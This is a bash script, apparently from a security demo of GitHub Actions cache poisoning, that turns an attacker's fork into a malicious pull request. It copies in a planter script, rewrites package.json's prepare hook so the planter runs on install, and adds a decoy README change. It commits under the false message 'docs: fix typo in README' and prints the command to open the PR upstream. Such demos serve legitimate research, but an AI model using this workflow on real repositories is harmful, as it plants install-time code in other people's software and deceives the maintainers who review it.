#!/usr/bin/env bash
# Apply the attack to a fresh attacker-fork checkout. Run from the fork's repo root.
#
# Each run creates a NEW timestamped branch so successive demos open distinct PRs
# instead of force-pushing or reopening the same one. The branch is committed and
# (optionally) pushed; the script prints the next-step gh CLI command for opening
# the PR.
#
#   git clone https://github.com/<attacker-account>/gh-actions-demo-cache-poisoning fork
#   cd fork
#   bash /path/to/attack/fork-changes/apply-attack.sh           # auto-branch, no push
#   bash /path/to/attack/fork-changes/apply-attack.sh --push    # auto-branch, push + print PR command
#   bash /path/to/attack/fork-changes/apply-attack.sh --branch docs/fix-typo-3 --push
#
# Flags:
#   --branch <name>   Use this branch name instead of an auto-generated one.
#   --push            git push the new branch to origin after committing.
#   --no-commit       Skip the git commit (just stage the files).

set -euo pipefail

REPO_ROOT="$(pwd)"
ATTACK_DIR="$(cd "$(dirname "$0")" && pwd)"

BRANCH=""
DO_PUSH=0
DO_COMMIT=1

while [[ $# -gt 0 ]]; do
  case "$1" in
    --branch) BRANCH="$2"; shift 2 ;;
    --push) DO_PUSH=1; shift ;;
    --no-commit) DO_COMMIT=0; shift ;;
    *) echo "unknown flag: $1" >&2; exit 2 ;;
  esac
done

if [[ -z "$BRANCH" ]]; then
  BRANCH="docs/fix-typo-$(date +%Y%m%d-%H%M%S)"
fi

# Refuse to run on a dirty tree — the demo depends on a clean diff.
if [[ -n "$(git status --porcelain)" ]]; then
  echo "ERROR: working tree is dirty. Stash or commit first." >&2
  git status --short >&2
  exit 1
fi

# Branch from main (or the fork's default branch).
git fetch origin --quiet
DEFAULT_BRANCH="$(git symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | sed 's@^refs/remotes/origin/@@' || echo main)"
git checkout -B "$BRANCH" "origin/$DEFAULT_BRANCH"

# 1. Add the planter script.
mkdir -p "$REPO_ROOT/scripts"
cp "$ATTACK_DIR/scripts/dev-hook.js" "$REPO_ROOT/scripts/dev-hook.js"

# 2. Modify the prepare hook in package.json (preserves indentation/formatting).
node -e '
  const fs = require("fs");
  const path = require("path");
  const pkgPath = path.resolve("package.json");
  const txt = fs.readFileSync(pkgPath, "utf8");
  if (txt.includes("dev-hook.js")) {
    console.log("package.json already modified, skipping");
    process.exit(0);
  }
  const modified = txt.replace(
    /"prepare":\s*"npm run build"/,
    "\"prepare\": \"node scripts/dev-hook.js && npm run build\""
  );
  if (modified === txt) {
    console.error("FAIL: could not find prepare hook to modify");
    process.exit(1);
  }
  fs.writeFileSync(pkgPath, modified);
  console.log("modified package.json prepare hook");
'

# 3. Tiny innocent-looking README diff so the PR has a visible reason.
if grep -q "FIXME" README.md 2>/dev/null; then
  sed -i.bak 's/FIXME/(fixed)/' README.md && rm README.md.bak
elif [[ -f README.md ]]; then
  # No FIXME to fix — append a trivial trailing-newline-style fix instead.
  printf '\n' >> README.md
fi

git add -A

if [[ "$DO_COMMIT" -eq 1 ]]; then
  git commit -m "docs: fix typo in README" --quiet
fi

echo
echo "Branch:   $BRANCH"
echo "Status:   $([[ "$DO_COMMIT" -eq 1 ]] && echo committed || echo staged)"

if [[ "$DO_PUSH" -eq 1 ]]; then
  git push -u origin "$BRANCH" --quiet
  ATTACKER_REMOTE="$(git remote get-url origin | sed -E 's#.*github\.com[:/]##; s#\.git$##')"
  UPSTREAM="${UPSTREAM:-lullu57/gh-actions-demo-cache-poisoning}"
  echo "Pushed:   origin/$BRANCH"
  echo
  echo "Open the PR with:"
  echo "  gh pr create \\"
  echo "    --repo $UPSTREAM \\"
  echo "    --head $(echo "$ATTACKER_REMOTE" | cut -d/ -f1):$BRANCH \\"
  echo "    --base main \\"
  echo "    --title 'docs: fix typo in README' \\"
  echo "    --body 'tiny readme fix'"
else
  echo
  echo "Next:"
  echo "  git push -u origin $BRANCH"
  echo "  gh pr create --repo lullu57/gh-actions-demo-cache-poisoning \\"
  echo "    --head <your-account>:$BRANCH --base main \\"
  echo "    --title 'docs: fix typo in README' --body 'tiny readme fix'"
fi
